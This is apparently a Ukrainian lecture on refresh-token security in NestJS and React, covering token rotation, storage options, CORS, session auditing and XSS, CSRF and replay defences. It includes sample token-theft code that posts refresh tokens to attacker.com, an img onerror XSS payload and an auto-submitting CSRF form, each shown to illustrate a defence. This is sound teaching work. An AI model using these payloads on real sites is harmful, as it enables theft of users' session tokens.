### Ендпоінт POST /auth/refresh

```typescript
// src/auth/auth.controller.ts
@Post('refresh')
@HttpCode(HttpStatus.OK)
async refresh(
  @Req() request: Request,
  @Res({ passthrough: true }) response: Response,
) {
  // Витягування Refresh Token з HttpOnly Cookie
  const oldRefreshToken = request.cookies?.refreshToken;

  if (!oldRefreshToken) {
    throw new UnauthorizedException('Refresh token not found');
  }

  // Оновлення токенів з rotation
  const result = await this.authService.refreshTokens(
    oldRefreshToken,
    request.ip,
  );

  // Встановлення нового Refresh Token у Cookie
  response.cookie('refreshToken', result.refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000,
    path: '/auth/refresh',
  });

  return {
    statusCode: HttpStatus.OK,
    message: 'Tokens refreshed successfully',
    data: {
      accessToken: result.accessToken,
      tokenType: 'Bearer',
      expiresIn: result.expiresIn,
    },
  };
}
```

### Ендпоінт POST /auth/logout

```typescript
// src/auth/auth.controller.ts
@Post('logout')
@HttpCode(HttpStatus.OK)
@UseGuards(JwtAuthGuard)
async logout(
  @Req() request: Request,
  @Res({ passthrough: true }) response: Response,
  @CurrentUser() user: UserPayload,
) {
  const refreshToken = request.cookies?.refreshToken;

  if (refreshToken) {
    // Видалення Refresh Token з БД
    await this.authService.revokeRefreshToken(refreshToken);
  }

  // Видалення Cookie
  response.clearCookie('refreshToken', {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    path: '/auth/refresh',
  });

  return {
    statusCode: HttpStatus.OK,
    message: 'Logout successful',
  };
}
```

**Додатковий ендпоінт: Вихід з усіх пристроїв**

```typescript
@Post('logout-all')
@HttpCode(HttpStatus.OK)
@UseGuards(JwtAuthGuard)
async logoutAll(
  @CurrentUser() user: UserPayload,
  @Res({ passthrough: true }) response: Response,
) {
  // Видалення ВСІХ Refresh Tokens користувача
  await this.authService.revokeAllUserTokens(user.userId);

  // Видалення поточного Cookie
  response.clearCookie('refreshToken', {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    path: '/auth/refresh',
  });

  return {
    statusCode: HttpStatus.OK,
    message: 'Logged out from all devices successfully',
  };
}
```


---

## Безпечне зберігання токенів на клієнті

Вибір стратегії зберігання токенів на клієнті є критичним компромісом між безпекою та користувацькою взаємодією. Розглянемо переваги та недоліки різних підходів.

### Порівняння варіантів зберігання

::code-group

```typescript [1. localStorage (❌ НЕ рекомендовано)]
// ❌ ВРАЗЛИВИЙ до XSS атак
localStorage.setItem('access_token', accessToken);
localStorage.setItem('refresh_token', refreshToken);

// Зловмисник може витягти токени через ін'єктований скрипт:
const stolen = localStorage.getItem('refresh_token');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token: stolen }),
});

// Використання
const token = localStorage.getItem('access_token');
fetch('/api/users/profile', {
  headers: { Authorization: `Bearer ${token}` },
});
```

```typescript [2. sessionStorage (⚠️ Обмежено придатний)]
// ⚠️ Також вразливий до XSS, але токен втрачається при закритті вкладки
sessionStorage.setItem('access_token', accessToken);

// Переваги:
// ✅ Токен автоматично видаляється при закритті вкладки
// ✅ Не передається між вкладками

// Недоліки:
// ❌ Вразливий до XSS
// ❌ Користувач втрачає сесію при випадковому закритті вкладки
```

```typescript [3. HttpOnly Cookie (✅ Найбезпечніший)]
// ✅ Встановлюється сервером, недоступний для JavaScript
// Сервер встановлює Cookie у відповіді на /auth/login:
response.cookie('refreshToken', token, {
  httpOnly: true,  // ❌ JavaScript не може читати
  secure: true,    // ✅ Лише через HTTPS
  sameSite: 'strict',
});

// Клієнт НЕ має доступу до токена:
console.log(document.cookie); // "refreshToken" не відображається

// Браузер автоматично додає Cookie до запитів:
fetch('/auth/refresh', {
  credentials: 'include', // Дозволяє надсилання Cookies
});

// Переваги:
// ✅ Повний захист від XSS (JavaScript не має доступу)
// ✅ Автоматичне надсилання браузером

// Недоліки:
// ⚠️ Потребує CORS конфігурації для cross-origin запитів
// ⚠️ Складніша реалізація у мобільних застосунках
```

```typescript [4. In-Memory (✅ Рекомендовано для Access Token)]
// ✅ Токен зберігається лише у змінній JavaScript (пам'ять процесу)
class AuthStore {
  private accessToken: string | null = null;

  setAccessToken(token: string) {
    this.accessToken = token;
  }

  getAccessToken(): string | null {
    return this.accessToken;
  }

  clearAccessToken() {
    this.accessToken = null;
  }
}

const authStore = new AuthStore();

// Переваги:
// ✅ Не зберігається у localStorage/sessionStorage
// ✅ Автоматично очищається при перезавантаженні сторінки
// ✅ Недоступний для JavaScript з інших вкладок

// Недоліки:
// ❌ Втрачається при перезавантаженні сторінки
// ❌ Потрібен механізм відновлення через Refresh Token
```

::

### Рекомендована гібридна стратегія

**Оптимальний підхід для більшості SPA застосунків:**

1. **Access Token** → зберігається **in-memory** (змінна JavaScript або React Context).
2. **Refresh Token** → зберігається у **HttpOnly Cookie** (встановлюється сервером).

**Чому це найбезпечніше:**

- ✅ Access Token недоступний для XSS атак (не у `localStorage`).
- ✅ Refresh Token недоступний для XSS атак (HttpOnly Cookie).
- ✅ При перезавантаженні сторінки Access Token втрачається, але автоматично відновлюється через `/auth/refresh`.
- ✅ Короткий TTL Access Token (15 хв) мінімізує вікно вразливості.

**Реалізація у React:**

```typescript
// src/contexts/AuthContext.tsx
import React, { createContext, useContext, useState, useEffect } from 'react';
import api from '../api/axios-instance';

interface AuthContextType {
  accessToken: string | null;
  setAccessToken: (token: string | null) => void;
  logout: () => Promise<void>;
}

const AuthContext = createContext<AuthContextType | undefined>(undefined);

export function AuthProvider({ children }: { children: React.ReactNode }) {
  const [accessToken, setAccessToken] = useState<string | null>(null);

  // Автоматичне отримання нового Access Token при завантаженні застосунку
  useEffect(() => {
    const initAuth = async () => {
      try {
        const { data } = await api.post('/auth/refresh', {}, {
          withCredentials: true, // Надсилає HttpOnly Cookie з Refresh Token
        });
        setAccessToken(data.data.accessToken);
      } catch (error) {
        // Refresh Token недійсний або відсутній — користувач не автентифікований
        setAccessToken(null);
      }
    };

    initAuth();
  }, []);

  const logout = async () => {
    try {
      await api.post('/auth/logout', {}, { withCredentials: true });
    } finally {
      setAccessToken(null);
    }
  };

  return (
    <AuthContext.Provider value={{ accessToken, setAccessToken, logout }}>
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth must be used within AuthProvider');
  }
  return context;
}
```

**Використання у компонентах:**

```typescript
// src/pages/ProfilePage.tsx
import React, { useEffect, useState } from 'react';
import { useAuth } from '../contexts/AuthContext';
import api from '../api/axios-instance';

export function ProfilePage() {
  const { accessToken } = useAuth();
  const [profile, setProfile] = useState(null);

  useEffect(() => {
    if (!accessToken) {
      // Користувач не автентифікований
      return;
    }

    const fetchProfile = async () => {
      try {
        // Access Token автоматично додається через Axios Interceptor
        const { data } = await api.get('/users/profile');
        setProfile(data.data);
      } catch (error) {
        console.error('Failed to load profile:', error);
      }
    };

    fetchProfile();
  }, [accessToken]);

  if (!accessToken) {
    return <p>Please log in to view your profile.</p>;
  }

  return <div>{/* Відображення профілю */}</div>;
}
```

### CORS конфігурація для HttpOnly Cookies

Якщо frontend та backend розміщені на різних доменах (наприклад, `app.example.com` та `api.example.com`), необхідно налаштувати CORS для дозволу передачі credentials:

```typescript
// src/main.ts (NestJS)
import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';
import * as cookieParser from 'cookie-parser';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // Увімкнення cookie-parser для читання Cookies
  app.use(cookieParser());

  // CORS конфігурація
  app.enableCors({
    origin: 'https://app.example.com', // ✅ Явно вказуємо домен фронтенду
    credentials: true, // ✅ Дозволяємо надсилання Cookies
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization'],
  });

  await app.listen(3000);
}
bootstrap();
```

**На клієнті (Axios):**

```typescript
// src/api/axios-instance.ts
import axios from 'axios';

const api = axios.create({
  baseURL: 'https://api.example.com',
  withCredentials: true, // ✅ Дозволяє надсилання та отримання Cookies
});

export default api;
```

::warning
**Критично важливо:** якщо використовуєте HttpOnly Cookies для cross-origin запитів, **ніколи** не встановлюйте `Access-Control-Allow-Origin: *` — це заборонено браузером при `credentials: true`. Завжди явно вказуйте домен фронтенду у `origin`.
::

---

## Сценарії компрометації та захист

Розглянемо різні вектори атак та механізми захисту для кожного з них.

### Сценарій 1: XSS атака (Cross-Site Scripting)

**Атака:**

Зловмисник ін'єктує JavaScript код через вразливість у застосунку (наприклад, через коментарі без санітизації):

```html
<!-- Шкідливий коментар користувача -->
<img src="x" onerror="
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('refresh_token')
  });
" />
```

**Захист:**

1. ✅ **Зберігання Refresh Token у HttpOnly Cookie** — JavaScript не має доступу.
2. ✅ **CSP (Content Security Policy)** — блокування inline scripts та обмеження джерел скриптів:

```typescript
// src/main.ts
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; connect-src 'self' https://api.example.com"
  );
  next();
});
```

3. ✅ **Санітизація вхідних даних** — використання бібліотек DOMPurify для очищення HTML:

```typescript
import DOMPurify from 'dompurify';

const userComment = DOMPurify.sanitize(rawComment);
```

### Сценарій 2: CSRF атака (Cross-Site Request Forgery)

**Атака:**

Зловмисницький сайт надсилає запит до `/auth/refresh` від імені автентифікованого користувача:

```html
<!-- Сторінка зловмисника attacker.com -->
<form action="https://api.example.com/auth/refresh" method="POST">
  <input type="submit" value="Виграй iPhone!" />
</form>
<script>
  document.forms[0].submit(); // Автоматична відправка
</script>
```

**Захист:**

1. ✅ **SameSite Cookie** — браузер не надсилає Cookie у cross-site запитах:

```typescript
response.cookie('refreshToken', token, {
  sameSite: 'strict', // Або 'lax' для менш жорстких обмежень
});
```

2. ✅ **CSRF Token** — додатковий токен у заголовку або формі (подвійний захист):

```typescript
// Генерація CSRF токена при логіні
const csrfToken = randomUUID();
response.cookie('csrf_token', csrfToken, { httpOnly: false });

// Перевірка CSRF токена при /auth/refresh
if (request.headers['x-csrf-token'] !== request.cookies.csrf_token) {
  throw new ForbiddenException('Invalid CSRF token');
}
```

### Сценарій 3: Token Replay Attack

**Атака:**

Зловмисник перехоплює Refresh Token (через MITM або витік БД) та намагається використати його багаторазово.

**Захист:**

1. ✅ **Token Rotation** — при кожному використанні токен інвалідується (описано вище).
2. ✅ **Reuse Detection** — виявлення спроб використання старого токена → відкликання всіх токенів користувача.
3. ✅ **Device Fingerprinting** — прив'язка токена до пристрою:

```typescript
import Fingerprint from 'fingerprintjs2';

// На клієнті: генерація fingerprint
Fingerprint.get((components) => {
  const fingerprint = Fingerprint.x64hash128(
    components.map((c) => c.value).join(''),
    31
  );
  
  // Надсилаємо fingerprint при логіні та refresh
  api.post('/auth/login', { email, password, fingerprint });
});

// На сервері: збереження fingerprint разом з токеном
await this.refreshTokenRepo.save({
  token: refreshToken,
  userId: user.id,
  fingerprint: request.body.fingerprint,
});

// Перевірка fingerprint при refresh
if (tokenRecord.fingerprint !== request.body.fingerprint) {
  throw new UnauthorizedException('Device fingerprint mismatch');
}
```

::note
**Обмеження fingerprinting:** device fingerprint не є абсолютно унікальним та може змінюватися при оновленні браузера або зміні налаштувань. Використовуйте його як додатковий рівень захисту, а не єдиний механізм верифікації.
::


---

## Моніторинг та аудит безпеки сесій

Для enterprise-систем критично важливо надавати користувачам можливість відстежувати активні сесії та виявляти підозрілу активність.

### UI для управління сесіями

**Таблиця активних сесій у профілі користувача:**

```typescript
// src/sessions/sessions.controller.ts
import { Controller, Get, Delete, Param, UseGuards } from '@nestjs/common';
import { JwtAuthGuard } from '../auth/guards/jwt-auth.guard';
import { CurrentUser } from '../auth/decorators/current-user.decorator';
import { SessionsService } from './sessions.service';

@Controller('sessions')
@UseGuards(JwtAuthGuard)
export class SessionsController {
  constructor(private readonly sessionsService: SessionsService) {}

  /**
   * GET /sessions
   * Отримання списку всіх активних сесій користувача
   */
  @Get()
  async getSessions(@CurrentUser('userId') userId: string) {
    const sessions = await this.sessionsService.getUserSessions(userId);

    return {
      statusCode: 200,
      data: sessions.map((session) => ({
        id: session.id,
        deviceName: session.deviceName || 'Unknown Device',
        ipAddress: session.ipAddress,
        location: this.getLocationFromIP(session.ipAddress), // GeoIP lookup
        createdAt: session.createdAt,
        lastUsedAt: session.lastUsedAt,
        isCurrent: this.isCurrentSession(session.token, userId),
      })),
    };
  }

  /**
   * DELETE /sessions/:sessionId
   * Відкликання конкретної сесії
   */
  @Delete(':sessionId')
  async revokeSession(
    @Param('sessionId') sessionId: string,
    @CurrentUser('userId') userId: string,
  ) {
    await this.sessionsService.revokeSession(sessionId, userId);

    return {
      statusCode: 200,
      message: 'Session revoked successfully',
    };
  }

  private getLocationFromIP(ip: string): string {
    // Використання GeoIP бази даних (MaxMind GeoLite2)
    // return geoip.lookup(ip)?.city || 'Unknown Location';
    return 'Київ, Україна'; // Placeholder
  }

  private isCurrentSession(token: string, userId: string): boolean {
    // Порівняння з токеном поточного запиту
    // Реалізація залежить від архітектури
    return false;
  }
}
```

**Приклад відповіді:**

```json
{
  "statusCode": 200,
  "data": [
    {
      "id": "550e8400-e29b-41d4-a716-446655440000",
      "deviceName": "MacBook Pro (Chrome)",
      "ipAddress": "203.0.113.42",
      "location": "Київ, Україна",
      "createdAt": "2026-09-06T10:00:00Z",
      "lastUsedAt": "2026-09-06T15:30:00Z",
      "isCurrent": true
    },
    {
      "id": "6ba7b810-9dad-11d1-80b4-00c04fd430c8",
      "deviceName": "iPhone 14 Pro (Safari)",
      "ipAddress": "198.51.100.23",
      "location": "Львів, Україна",
      "createdAt": "2026-09-05T08:00:00Z",
      "lastUsedAt": "2026-09-05T20:15:00Z",
      "isCurrent": false
    },
    {
      "id": "7c9e6679-7425-40de-944b-e07fc1f90ae7",
      "deviceName": "Unknown Device",
      "ipAddress": "192.0.2.146",
      "location": "Пекін, Китай",
      "createdAt": "2026-09-04T03:22:00Z",
      "lastUsedAt": "2026-09-04T03:25:00Z",
      "isCurrent": false
    }
  ]
}
```

**Frontend (React) для відображення сесій:**

```typescript
// src/pages/SecuritySettingsPage.tsx
import React, { useEffect, useState } from 'react';
import api from '../api/axios-instance';

interface Session {
  id: string;
  deviceName: string;
  ipAddress: string;
  location: string;
  createdAt: string;
  lastUsedAt: string;
  isCurrent: boolean;
}

export function SecuritySettingsPage() {
  const [sessions, setSessions] = useState<Session[]>([]);

  useEffect(() => {
    const fetchSessions = async () => {
      const { data } = await api.get('/sessions');
      setSessions(data.data);
    };
    fetchSessions();
  }, []);

  const handleRevoke = async (sessionId: string) => {
    if (!confirm('Ви впевнені, що хочете завершити цю сесію?')) {
      return;
    }

    try {
      await api.delete(`/sessions/${sessionId}`);
      setSessions((prev) => prev.filter((s) => s.id !== sessionId));
      alert('Сесію успішно завершено');
    } catch (error) {
      alert('Помилка при завершенні сесії');
    }
  };

  return (
    <div className="security-settings">
      <h2>Активні сесії</h2>
      <table>
        <thead>
          <tr>
            <th>Пристрій</th>
            <th>Локація</th>
            <th>Останній вхід</th>
            <th>Дії</th>
          </tr>
        </thead>
        <tbody>
          {sessions.map((session) => (
            <tr key={session.id}>
              <td>
                {session.deviceName}
                {session.isCurrent && <span className="badge">Поточна</span>}
              </td>
              <td>
                {session.location}
                <br />
                <small className="text-muted">{session.ipAddress}</small>
              </td>
              <td>{new Date(session.lastUsedAt).toLocaleString('uk-UA')}</td>
              <td>
                {!session.isCurrent && (
                  <button
                    onClick={() => handleRevoke(session.id)}
                    className="btn btn-danger btn-sm"
                  >
                    Завершити
                  </button>
                )}
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}
```

### Логування подій безпеки

Для аудиту та виявлення аномалій необхідно логувати критичні події:

```typescript
// src/audit/audit.service.ts
import { Injectable } from '@nestjs/common';
import { InjectRepository } from '@nestjs/typeorm';
import { Repository } from 'typeorm';
import { AuditLog } from './entities/audit-log.entity';

enum AuditEventType {
  LOGIN_SUCCESS = 'login_success',
  LOGIN_FAILED = 'login_failed',
  TOKEN_REFRESHED = 'token_refreshed',
  TOKEN_REUSE_DETECTED = 'token_reuse_detected',
  LOGOUT = 'logout',
  PASSWORD_CHANGED = 'password_changed',
  SESSION_REVOKED = 'session_revoked',
}

@Injectable()
export class AuditService {
  constructor(
    @InjectRepository(AuditLog)
    private readonly auditLogRepo: Repository<AuditLog>,
  ) {}

  async log(
    userId: string,
    eventType: AuditEventType,
    metadata?: Record<string, any>,
  ) {
    await this.auditLogRepo.save({
      userId,
      eventType,
      metadata,
      timestamp: new Date(),
    });

    // Опціонально: надіслати критичні події до SIEM системи
    if (eventType === AuditEventType.TOKEN_REUSE_DETECTED) {
      // await this.siemClient.sendAlert({ userId, eventType, metadata });
    }
  }

  /**
   * Виявлення аномальної активності
   */
  async detectAnomalies(userId: string): Promise<string[]> {
    const alerts: string[] = [];

    // 1. Перевірка на множинні входи з різних локацій за короткий час
    const recentLogins = await this.auditLogRepo.find({
      where: { userId, eventType: AuditEventType.LOGIN_SUCCESS },
      order: { timestamp: 'DESC' },
      take: 5,
    });

    const locations = new Set(recentLogins.map((log) => log.metadata.location));
    if (locations.size > 2) {
      alerts.push('Виявлено входи з кількох різних локацій за останню годину');
    }

    // 2. Перевірка на множинні невдалі спроби входу
    const failedAttempts = await this.auditLogRepo.count({
      where: {
        userId,
        eventType: AuditEventType.LOGIN_FAILED,
        timestamp: new Date(Date.now() - 60 * 60 * 1000), // Остання година
      },
    });

    if (failedAttempts > 5) {
      alerts.push('Виявлено 5+ невдалих спроб входу за останню годину');
    }

    return alerts;
  }
}
```

---

## Візуалізація життєвого циклу токенів

::mermaid

```mermaid
stateDiagram-v2
    [*] --> Login: POST /auth/login
    Login --> TokensGenerated: email + password
    TokensGenerated --> ActiveSession: Access Token (15m)<br/>Refresh Token (7d)
    
    ActiveSession --> APIRequest: API запити
    APIRequest --> TokenValid: Перевірка Access Token
    TokenValid --> APIRequest: 200 OK
    
    TokenValid --> TokenExpired: Access Token прострочений
    TokenExpired --> RefreshEndpoint: POST /auth/refresh
    
    RefreshEndpoint --> RefreshValid: Перевірка Refresh Token
    RefreshValid --> TokenRotation: ✅ Видалення старого<br/>✅ Генерація нового
    TokenRotation --> ActiveSession: Нова пара токенів
    
    RefreshValid --> TokenReuse: ❌ Токен вже використаний
    TokenReuse --> SecurityBreach: 🚨 Відкликання ВСІХ токенів
    SecurityBreach --> [*]: Вимога повторного входу
    
    ActiveSession --> Logout: POST /auth/logout
    Logout --> TokenRevoked: Видалення Refresh Token
    TokenRevoked --> [*]
    
    style TokensGenerated fill:#10b981,stroke:#047857,color:#ffffff
    style ActiveSession fill:#3b82f6,stroke:#1d4ed8,color:#ffffff
    style TokenRotation fill:#8b5cf6,stroke:#6d28d9,color:#ffffff
    style SecurityBreach fill:#ef4444,stroke:#b91c1c,color:#ffffff
```

::

---

## Інтерактивні запитання для самоперевірки

::accordion

::accordion-item{label="❓ Чому не можна просто збільшити TTL Access Token до 7 днів замість використання Refresh Token?" icon="i-lucide-help-circle"}

Довгоживучий Access Token створює катастрофічну вразливість безпеки: якщо токен буде скомпрометований (через XSS, витік бази даних, перехоплення трафіку), зловмисник матиме **повний доступ до облікового запису протягом усіх 7 днів** без жодної можливості відкликання з боку системи.

JWT токени є **самодостатніми** (self-contained) — сервер не зберігає їхній стан і не може їх інвалідувати без створення blacklist (що знищує переваги JWT). Навіть якщо користувач змінить пароль або адміністратор заблокує обліковий запис, токен залишиться валідним до закінчення `exp`.

Архітектура Refresh Token вирішує цю проблему:

- **Access Token** має короткий TTL (15 хв) → навіть при компрометації вікно вразливості мінімальне.
- **Refresh Token** зберігається у БД → може бути відкликаний у будь-який момент.
- **Token Rotation** → кожне використання Refresh Token інвалідує попередній, що дозволяє виявляти компрометацію.

::

::accordion-item{label="❓ Що станеться, якщо користувач відкриє застосунок у двох вкладках одночасно?" icon="i-lucide-help-circle"}

При правильній реалізації це **не створює проблем** завдяки механізму Axios Interceptor та черзі запитів:

1. **Вкладка 1:** Access Token прострочений → викликає `/auth/refresh` → встановлює `isRefreshing = true`.
2. **Вкладка 2:** Access Token прострочений → бачить `isRefreshing = true` → підписується на результат через `subscribeTokenRefresh()`.
3. Сервер повертає нову пару токенів → обидві вкладки отримують новий Access Token через механізм підписки.
4. Обидві вкладки повторюють свої оригінальні запити з новим токеном.

**Проте є нюанс з HttpOnly Cookies:** якщо Refresh Token зберігається у Cookie, то після оновлення токена у **Вкладці 1**, Cookie автоматично оновлюється для всього домену. **Вкладка 2** при спробі оновити токен отримає вже **новий** Refresh Token з Cookie, а старий буде видалено через rotation.

**Рішення:** використовуйте блокування на рівні `localStorage` або Redis для координації між вкладками:

```typescript
// Перевірка, чи інша вкладка вже оновлює токени
const lockKey = 'token_refresh_lock';
const lock = localStorage.getItem(lockKey);

if (lock && Date.now() - parseInt(lock) < 5000) {
  // Інша вкладка вже оновлює токени — чекаємо
  await new Promise((resolve) => setTimeout(resolve, 1000));
} else {
  localStorage.setItem(lockKey, Date.now().toString());
  // Виконуємо refresh
  // ...
  localStorage.removeItem(lockKey);
}
```

::

::accordion-item{label="❓ Чи безпечно зберігати Refresh Token у LocalStorage замість HttpOnly Cookie для мобільних застосунків?" icon="i-lucide-help-circle"}

Для **нативних мобільних застосунків** (React Native, Flutter, Swift/Kotlin) використання `localStorage` або еквівалентних сховищ (Keychain на iOS, Keystore на Android) є **прийнятним**, оскільки:

- ✅ Нативні застосунки **не мають XSS вразливостей** — код не завантажується з інтернету та не може бути модифікований зловмисником.
- ✅ Нативні сховища (Keychain, Keystore) надають **апаратне шифрування** токенів.

Проте для **веб-застосунків** (включаючи PWA):

- ❌ `localStorage` є **категорично небезпечним** для Refresh Token через вразливість до XSS атак.
- ✅ HttpOnly Cookie залишається єдиним безпечним варіантом.

**Гібридний підхід для універсальності:**

Якщо ваш застосунок має і веб, і мобільну версію:

- **Веб:** Refresh Token у HttpOnly Cookie.
- **Мобільний додаток:** Refresh Token у Keychain/Keystore з можливістю передачі через API.

```typescript
// Мобільний застосунок надсилає Refresh Token у тілі запиту
POST /auth/refresh
{
  "refreshToken": "6ba7b810-9dad-11d1-80b4-00c04fd430c8",
  "platform": "mobile"
}

// Веб надсилає через Cookie
POST /auth/refresh
Cookie: refreshToken=6ba7b810-9dad-11d1-80b4-00c04fd430c8
```

::

::accordion-item{label="❓ Скільки Refresh Tokens може мати один користувач одночасно?" icon="i-lucide-help-circle"}

**Залежить від вашої політики безпеки:**

**Варіант 1: Необмежена кількість (рекомендовано)**

Кожен пристрій/браузер користувача має власний Refresh Token. Це дозволяє:

- ✅ Користувач може бути автентифікованим на робочому ноутбуці, домашньому комп'ютері, телефоні та планшеті одночасно.
- ✅ Користувач може відкликати токен конкретного пристрою без виходу з інших.

```sql
SELECT COUNT(*) FROM refresh_tokens WHERE user_id = 'user-uuid';
-- Може повертати 5-10 активних токенів
```

**Варіант 2: Обмежена кількість (підвищена безпека)**

Максимум N активних токенів на користувача (наприклад, 3). При створенні нового токена найстаріший автоматично видаляється:

```typescript
const existingTokens = await this.refreshTokenRepo.find({
  where: { user: { id: userId } },
  order: { createdAt: 'ASC' },
});

if (existingTokens.length >= 3) {
  // Видаляємо найстаріший токен
  await this.refreshTokenRepo.delete(existingTokens[0].id);
}
```

**Варіант 3: Один токен на користувача (максимальна безпека, погана UX)**

При логіні всі попередні токени інвалідуються. Користувач може бути автентифікованим лише на одному пристрої:

```typescript
// Видалення ВСІХ існуючих токенів перед створенням нового
await this.refreshTokenRepo.delete({ user: { id: userId } });
```

❌ **Недолік:** користувач виштовхується з усіх інших пристроїв при вході на новому.

::

::accordion-item{label="❓ Чи можна відновити доступ після виявлення token reuse?" icon="i-lucide-help-circle"}

**Так, але з обережністю.** Коли система виявляє спробу використання вже інвалідованого Refresh Token, вона інтерпретує це як **компрометацію** та автоматично відкликає всі токени користувача для безпеки. Це означає:

1. **Легітимний користувач** втрачає доступ на всіх пристроях.
2. **Зловмисник** також втрачає доступ (його вкрадений токен більше не валідний).

**Відновлення доступу:**

- Користувач змушений **увійти повторно** з email та паролем.
- Система може надіслати **email-сповіщення** про підозрілу активність з інструкціями:

```
Тема: Виявлено підозрілу активність у вашому обліковому записі

Ми виявили спробу несанкціонованого доступу до вашого облікового запису
з IP-адреси 203.0.113.42 (Пекін, Китай). Усі активні сесії були завершені
для вашої безпеки.

Якщо це були ви, будь ласка, увійдіть знову. Якщо ні — натисніть тут
для зміни пароля.
```

**Рекомендація:** впровадьте **grace period** (наприклад, 5 хвилин) перед повним відкликанням:

```typescript
// При виявленні reuse — тимчасово блокуємо токени
await this.refreshTokenRepo.update(
  { user: { id: userId } },
  { status: 'suspended', suspendedAt: new Date() }
);

// Надсилаємо email з можливістю підтвердження легітимності
await this.emailService.sendSuspensionAlert(user.email);

// Через 5 хвилин, якщо користувач не підтвердив — видаляємо назавжди
setTimeout(async () => {
  const token = await this.refreshTokenRepo.findOne({ user: { id: userId } });
  if (token && token.status === 'suspended') {
    await this.refreshTokenRepo.delete({ user: { id: userId } });
  }
}, 5 * 60 * 1000);
```

::

::

---

## Підсумок та ключові висновки

Refresh Token архітектура є індустріальним стандартом для балансування безпеки та користувацької зручності у сучасних веб-застосунках. Основні принципи, які необхідно запам'ятати:

::card-group

::card{title="✅ Обов'язкові практики" icon="i-lucide-check-circle"}

- Використовуйте **короткий Access Token (15 хв)** + **довгий Refresh Token (7-30 днів)**.
- Зберігайте Refresh Token у **HttpOnly Cookie** для веб-застосунків або **Keychain/Keystore** для мобільних.
- Впроваджуйте **Token Rotation** — інвалідація старого токена при видачі нової пари.
- Реалізуйте **Reuse Detection** для виявлення компрометації та автоматичного відкликання всіх токенів.
- Зберігайте Refresh Tokens у **БД або Redis** для можливості відкликання.

::

::card{title="❌ Категоричні заборони" icon="i-lucide-x-circle"}

- **Ніколи** не зберігайте Refresh Token у `localStorage` для веб-застосунків (XSS вразливість).
- **Не використовуйте** довгоживучі Access Token (7+ днів) без Refresh Token.
- **Не передавайте** Refresh Token разом зі звичайними API запитами — лише для `/auth/refresh`.
- **Не ігноруйте** CORS конфігурацію при використанні HttpOnly Cookies для cross-origin запитів.
- **Не забувайте** про SameSite атрибут для захисту від CSRF атак.

::

::

У наступній лекції ми розглянемо механізм **OAuth 2.0 та OpenID Connect** — як інтегрувати автентифікацію через сторонніх провайдерів (Google, GitHub, Facebook) та делегувати управління ідентичністю спеціалізованим сервісам.

